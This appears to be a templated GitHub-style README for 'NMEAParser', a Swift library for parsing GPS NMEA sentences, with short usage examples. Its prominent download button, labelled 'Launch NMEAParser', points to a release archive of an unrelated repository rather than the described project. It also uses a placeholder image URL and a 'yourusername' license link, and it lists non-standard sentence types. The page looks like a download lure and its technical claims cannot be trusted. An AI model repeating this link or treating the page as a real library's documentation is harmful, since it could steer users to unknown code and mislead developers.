# 🛰️ NMEAParser - Your Ultimate NMEA Parser for iOS and macOS Apps 🧭

![NMEAParser Banner](https://imageurl.com)

## Overview
Welcome to NMEAParser, a high-performance native-built NMEA parser designed specifically for iOS and macOS applications. This versatile library allows you to easily parse NMEA data received from GPS, GNSS, or other geo-location devices within your Swift projects.🚀

## Features
🌟 Parse various NMEA sentence types including GGA, GSV, RMC, SPM, RTK, and more.  
🌟 Fully compatible with Swift 5 and Swift 6.  
🌟 Swift Package Manager integration for seamless library import.  
🌟 Built-in support for NTRIP and RTCM protocols.  
🌟 SwiftUI compatible for modern, reactive UI development.  

## Installation
To get started with NMEAParser, simply click on the button below to download the latest release:

[![Download NMEAParser v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Launch NMEAParser v1.0.0")

If the link does not work, please visit the "Releases" section of the repository to access the latest version.

## Usage
Using NMEAParser in your project is straightforward. After downloading the library, add it to your Xcode project as a Swift Package. Import the module wherever you need to parse NMEA data and start leveraging its powerful features.

```swift
import NMEAParser

let data = "$GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47"
if let nmeaSentence = NMEAParser.parse(sentence: data) {
    print(nmeaSentence)
}
```

## Examples
Here are some examples of how you can use NMEAParser in your iOS or macOS applications:

### Parsing GGA Sentences
```swift
let ggaSentence = "$GPGGA,160036.309,2239.1282,N,11402.0806,E,1,07,1.2,21.2,M,-11.5,M,,*7A"
if let ggaData = NMEAParser.parse(sentence: ggaSentence) as? GGAData {
    print("Latitude: \(ggaData.latitude), Longitude: \(ggaData.longitude)")
}
```

### Parsing GSV Sentences
```swift
let gsvSentence = "$GPGSV,3,2,11,09,00,099,,12,24,262,,17,18,071,,19,01,035,*7D"
if let gsvData = NMEAParser.parse(sentence: gsvSentence) as? GSVData {
    print("Satellites in view: \(gsvData.satellitesInView)")
}
```

## Contributing
We welcome contributions to enhance the functionality of NMEAParser. Whether you want to add support for additional NMEA sentence types, improve performance, or fix bugs, your contributions are valuable. Fork the repository, make your changes, and submit a pull request!

## License
NMEAParser is licensed under the MIT License. See the [LICENSE](https://github.com/yourusername/NMEAParser/blob/main/LICENSE) file for more details.

---

🚗 Navigate through your geo-location data with ease using NMEAParser! Happy coding! 🛰️

[powered by Swift](https://swift.org/) & [Xcode](https://developer.apple.com/xcode/) 🍏

_Note: Images are for illustrative purposes and may not reflect actual library output._